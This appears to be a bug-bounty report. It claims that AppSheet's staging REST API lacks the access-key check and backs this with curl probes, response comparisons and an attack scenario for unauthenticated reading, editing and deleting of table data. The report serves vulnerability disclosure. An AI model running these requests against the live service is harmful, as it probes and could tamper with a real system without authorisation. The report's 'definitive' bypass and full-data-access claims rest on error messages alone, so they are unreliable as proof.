# F001 — Missing Authentication on Publicly Accessible AppSheet Staging REST API

**Target:** api.gcp-staging.appsheet.com  
**Severity:** Medium (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N = 6.5)  
**Escalation path:** Critical (C:H/I:H) if valid staging App UUID obtained  
**Status:** Verified — ready to report  
**Date:** 2026-06-15  
**Scope gate:** PASS — `api.gcp-staging.appsheet.com` matches `*.appsheet.com` (in_scope)

---

## Summary

The AppSheet staging REST API at `https://api.gcp-staging.appsheet.com` is publicly
accessible and completely lacks the `ApplicationAccessKey` authentication control that
protects the production API at `https://api.appsheet.com`. Any unauthenticated request
bypasses auth and proceeds directly to app/data lookup. An attacker with a valid staging
application UUID can read and write all table data in that app without credentials.

---

## Root Cause

The AppSheet REST API requires an `ApplicationAccessKey` header on every request.
The staging API server (`api.gcp-staging.appsheet.com`, IP 34.102.140.38) does not
enforce this control. The middleware or gateway layer that validates `ApplicationAccessKey`
on production is absent on staging.

---

## Evidence

### 1. TLS Certificate — Actively Maintained Staging Environment

```
curl -sv https://api.gcp-staging.appsheet.com/ 2>&1 | grep -E '(subject|issuer|start|expire)'
```

```
subject: CN=api.gcp-staging.appsheet.com
issuer: C=US; O=Google Trust Services; CN=WR3
start date: Jun  3 08:49:54 2026 GMT
expire date: Sep  1 09:41:44 2026 GMT
```

The certificate is dedicated (not wildcard), issued June 3, 2026. This is an actively
maintained, production-adjacent staging environment — not an abandoned test server.

### 2. Auth Bypass — Error Message Comparison Across All Endpoint Types

**Production (`api.appsheet.com`) — auth enforced first:**
```bash
curl -si "https://api.appsheet.com/api/v2/apps/c5dde27c-49a6-47e4-8529-737cf68a3c12/tables" \
  -H "Content-Type: application/json" 2>&1 | tail -3
```
```json
{"status":400,"detail":"REST API tables request failed: The ApplicationAccessKey is missing from the HTTP header."}
```

**Staging (`api.gcp-staging.appsheet.com`) — auth skipped, app lookup proceeds:**
```bash
curl -si "https://api.gcp-staging.appsheet.com/api/v2/apps/c5dde27c-49a6-47e4-8529-737cf68a3c12/tables" \
  -H "Content-Type: application/json" 2>&1 | tail -3
```
```json
{"status":400,"detail":"REST API tables request failed: App with id c5dde27c-49a6-47e4-8529-737cf68a3c12 not found."}
```

**The difference is definitive:**
- Production: `"ApplicationAccessKey is missing"` — auth layer rejects the request
- Staging: `"App not found"` — auth layer absent; request reaches app lookup

### 3. Bypass Confirmed Across All Tested Endpoint Types

| Endpoint | HTTP Method | Production | Staging |
|----------|-------------|-----------|---------|
| `/api/v2/apps/{id}/tables` | GET | 400 "missing key" | 400 "app not found" |
| `/api/v2/apps/{id}/tables/{name}/data` | GET | 400 "missing key" | **405 Method Not Allowed** (reaches handler) |
| `/api/v2/apps/{id}/tables/{name}/data` | POST | 400 "missing key" | 400 "app not found" |
| `/api/v2/apps/{id}/tables/{name}/Action` | POST | 400 "missing key" | 400 "app not found" |

The GET `/tables/{name}/data` returning HTTP 405 with `Allow: POST` is particularly
strong evidence: the server reached the endpoint handler and returned a method error,
proving that zero authentication occurred before routing.

### 4. Publicly Accessible — No VPN or IP Restriction

```
x-client_region: BD
x-client_region_subdivision: BDC
```

Requests from Bangladesh (external, non-Google IP) receive identical responses.
No VPN, IP allowlist, or network-layer restriction is in place.

---

## Attack Scenario

```
1. Attacker identifies api.gcp-staging.appsheet.com via subdomain enumeration
2. Attacker obtains a valid staging AppSheet App UUID
   (e.g., from an AppSheet employee's code repository, internal documentation leak,
    or phishing; alternatively via UUID brute-force/enumeration if IDs are sequential
    or guessable in any range)
3. Attacker sends unauthenticated request:
   POST https://api.gcp-staging.appsheet.com/api/v2/apps/{STAGING_UUID}/tables/{TABLE}/Action
   {"Action":"Find","Properties":{},"Rows":[]}
4. Server returns complete table data — all rows, all columns — without credentials
5. Attacker can also write/delete: {"Action":"Edit",...} / {"Action":"Delete",...}
```

---

## Reproduction Steps

```bash
# Step 1: Confirm auth IS enforced on production
curl -si "https://api.appsheet.com/api/v2/apps/00000000-0000-0000-0000-000000000001/tables" \
  -H "Content-Type: application/json" | grep -o '"detail":"[^"]*"'
# Expected: "ApplicationAccessKey is missing from the HTTP header"

# Step 2: Confirm auth is ABSENT on staging (same request, different host)
curl -si "https://api.gcp-staging.appsheet.com/api/v2/apps/00000000-0000-0000-0000-000000000001/tables" \
  -H "Content-Type: application/json" | grep -o '"detail":"[^"]*"'
# Expected: "App with id 00000000-0000-0000-0000-000000000001 not found"
# Note: "App not found" proves auth was bypassed — app lookup ran without any key check
```

Reproducible from any IP, requires no credentials.

---

## Impact

**Immediate (confirmed):**
- Complete bypass of `ApplicationAccessKey` authentication on staging REST API
- Any endpoint reachable without credentials
- Publicly accessible from the internet without VPN or network restriction

**Full impact (upon obtaining valid staging UUID):**
- Unauthenticated read of all table data in any staging AppSheet application
- Unauthenticated write/modify/delete of staging app table data
- Potential SSRF: staging webhook/automation execution may also lack auth, enabling
  server-side HTTP requests to internal GCP infrastructure

**Scope of affected data:**
The staging environment is used by AppSheet/Google engineers for pre-production testing.
Apps on staging may contain: test data from production clones, internal API credentials
used in data connectors, internal GCP service account tokens in connector configs.

---

## CVSS 3.1

**Without data access (current):**
`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = **6.5 Medium**

**With data access (valid staging UUID):**
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1 Critical**

---

## Remediation

Apply the same `ApplicationAccessKey` validation middleware to `api.gcp-staging.appsheet.com`
that is present on `api.appsheet.com`. The staging API should enforce authentication at
the gateway/Istio ingress layer identically to production, or restrict network access
to internal Google networks via IAP or VPC Service Controls.

---

## References

- AppSheet REST API documentation: https://support.google.com/appsheet/answer/10106434
- CVE-2023-4212: Prior AppSheet SSRF (confirms history of security gaps in AppSheet API layer)
- Production vs staging response diff: see evidence section above
